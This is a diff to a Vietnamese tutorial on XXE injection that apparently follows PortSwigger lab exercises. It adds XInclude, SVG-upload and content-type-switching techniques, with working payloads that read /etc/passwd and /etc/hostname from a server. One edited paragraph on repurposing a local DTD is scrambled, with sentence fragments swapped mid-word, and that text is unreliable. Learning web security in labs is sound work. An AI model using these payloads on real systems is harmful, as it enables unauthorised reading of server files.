@@ -62,6 +62,9 @@ Các loại hình tấn công XXE:
 - Exploiting XXE to retrieve files
 - Exploiting XXE to perform SSRF attacks
 - Exploiting blind XXE 
+- Xinclude attacks
+- XXE attacks qua file upload
+- XXE attacks qua việc chỉnh sửa content type
 
 ## 4. Exploiting XXE to retrieve files
 Dạng tấn công này ta sẽ dùng XXE để đọc 1 file bất kỳ của sever
@@ -236,11 +239,11 @@ Gửi XML đi và ta nhận về error message có chứa nội dung file
 ![lab5](./img/lab5.png)
 
 ### C. Blind XXE by repurposing a local DTD
-Ở 2 kỹ thuật trước thì hoạt động bình thường với external DTD, nhưng nó không hoạt động khi dùng internal DTD. Bởi vì đây là cơ chế của XML khi ta dùng parameter entity thì parameter entity chỉ được cho external DTD còn internal DTD thì không. Đó cũng giải thích vì sao ở 2 kỹ thuật trên ta lại phải cần thực hiện SSRF đến file DTD bên ngoài
+Ở 2 kỹ thuật trước thì hoạt động bình thường với external DTD, nhưng nó không hoạt động khi dùng internal DTD. Bởi vì đây là cơ chế của khi ta dùng parameter entity của XML, parameter entity chỉ dùng được cho external DTD còn internal DTD thì không. Đó cũng giải thích vì sao ở 2 kỹ thuật trên ta lại phải cần thực hiện SSRF đến file DTD bên ngoài
 
 Tuy nhiên sẽ ra sao nếu như ứng dụng chặn không cho thực hiện out-of-band?
 
-Trong tình huống đó thì ta vẫn có thể thực hiện trigger error message được, thông qua việc lợi dụng một lỗ hỏng của đặc tả ngôn ngữ XML. Lỗ hỏng đó chính là, nếu DTD document sử dụng hổn hợp internal và external DTD, thì những entity mà được khai báo trong internal DTD sẽ được ghi đè (redefine) những entity cùng tên trong external DTD. Khi lợi dụng lỗ hỏng này thì ta không cần lo tới việc parameter entity bị chặn trong internal DTD nửa
+Trong tình huống đó thì ta vẫn có thể thực hiện trigger error message được, thông qua việc lợi dụng một lỗ hỏng của đặc tả ngôn ngữ XML. Lđược khai báo trong internal DTD sẽ được ghi đè (redefine) những entity cùng tên trong external DTD. Khi lỗ hỏng đó chính là, nếu DTD document sử dụng hổn hợp internal và external DTD, thì những entity mà ợi dụng lỗ hỏng này thì ta không cần lo tới việc parameter entity bị chặn trong internal DTD nửa
 
 Tóm lại với kỹ thuật này thì attacker sẽ gọi một file external DTD trong hệ thống, và redefine những entity có trong file DTD này để trả về error message có chứa dữ liệu nhạy cảm. Mấy chốt của kỹ thuật này là ta phải tìm được trong hệ thống có những file DTD nào và tìm được entity thích hợp trong các file DTD đó để thực hiện redefine
 
@@ -287,3 +290,82 @@ Ta dùng payload:
 Output:
 
 ![lab9](./img/lab9.png)
+
+
+## 7. Xinclude attacks
+Một vài ứng dúng khi nhận dử liệu từ người dụng sẽ thực hiện nhúng dữ liệu đó vào tài liệu XML của 
+hệ thống. Trong trường hợp này, ta không thể thực hiện XXE theo cách thông thường, bởi vì không có quyền kiếm soát cả file XML nên không thể thực hiện khai báo ``DOCTYPE`` element
+
+Tuy nhiên ta có thể dùng XInclude để attack.
+>XInclude là một phần của đặc tả XML cho phép XML document include nội dung của hoặc 1 phần nội dung của tài liệu khác
+
+Ta có thể dùng XInclude để có thể get nội dung của một file bất kỳ, cho dù ta chỉ kiếm soát được một phần của XML docmument
+
+Để thực hiện XInclude attack, ta phải cần tham chiếu đến ``XInclude namespace`` và khai báo đường dẫn đến file muốn include. Ví dụ
+```xml
+<foo xmlns:xi="http://www.w3.org/2001/XInclude">
+<xi:include parse="text" href="file:///etc/passwd"/></foo>
+```
+
+### Ví dụ: Lab7 XXE injection portswigger
+Labs này vẫn là 1 trang check stock, tuy nhiên nội dung trao đổi giữa client và sever chỉ là ``productId`` và ``storeID``. 
+
+![lab7](./img/labs7.png)
+
+Sau đó 2 giá trị này sẽ được ghi vào file XML trên hệ thống. Ta chỉ kiếm soát được phần giá trị của 2 biến này nên ta sẽ thực hiện XInclude attack vào ``productId``
+
+Ta dùng payload sau:
+```xml
+<foo xmlns:xi="http://www.w3.org/2001/XInclude">
+<xi:include parse="text" href="file:///etc/passwd"/></foo>
+```
+
+Outout:
+
+![lab7](./img/lab7-out.png)
+
+## 8. XXE attack via fike upload
+Một số ứng dụng cho phép ta upload file và sẽ thực thi file đó trên sever. Một số file có sử dụng XML hay thành phần con của XML, ví dụ như file Docx, file SVG
+
+Ví dụ một ứng dụng cho phép upload ảnh, thì cho dù ta upload svg hay png/jpeg thì thư viện xử lý ảnh đều có thể xử lý được. Và bởi vì SVG format có sử dụng XMl, nên ta có thể upload một file SVG chứa mã độc để thực hiện tấn công XXE
+
+### Ví dụ: Lab8 XXE injection portswigger
+Labs cho ta một trang blog, ta có thẻ thực hiện post comment trong một bài viết bất kỳ, và trong phần post comment này ta cũng có thể post ảnh avatar. Lợi dụng điều này thay vì post một tấm ảnh thông thường ta sẽ tiến hành post một file svg chứa payload để đọc nội dung file /etc/hostname
+
+Đầu tiên ta tạo một file svg có nội dung sau:
+```xml
+<?xml version="1.0" standalone="yes"?>
+  <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
+    <svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
+      <text font-size="16" x="0" y="16">&xxe;</text>
+    </svg>
+```
+> Với tag ``<text>`` được để chèn test vào svg
+
+Ta up load file svg này lên
+
+Output:
+![lab8](./img/lab8.png)
+
+Ta có thể thấy đoạn text trên avatar của ta chính là nội dung của file /etc/hostname. Ta nhập lại và submit để hoàn thành lab
+
+## 9. XXE attacks qua việc chỉnh sửa content type
+Hầu hết các POST request thì đều sử dụng content type mặc định được tạo bởi HTTP forms như là ``application/x-www-form-urlencoded``. Tuy nhiên nếu ta thay đổi content type thì một số web vẫn sẽ nhận và thực hiện bình thường
+
+Ví dụ một request như sau:
+```http
+POST /action HTTP/1.0
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 7
+
+foo=bar
+```
+
+Ta có thể chỉnh lại content-type và chèn nội dung XML vào như sau:
+```http
+POST /action HTTP/1.0
+Content-Type: text/xml
+Content-Length: 52
+
+<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
+```
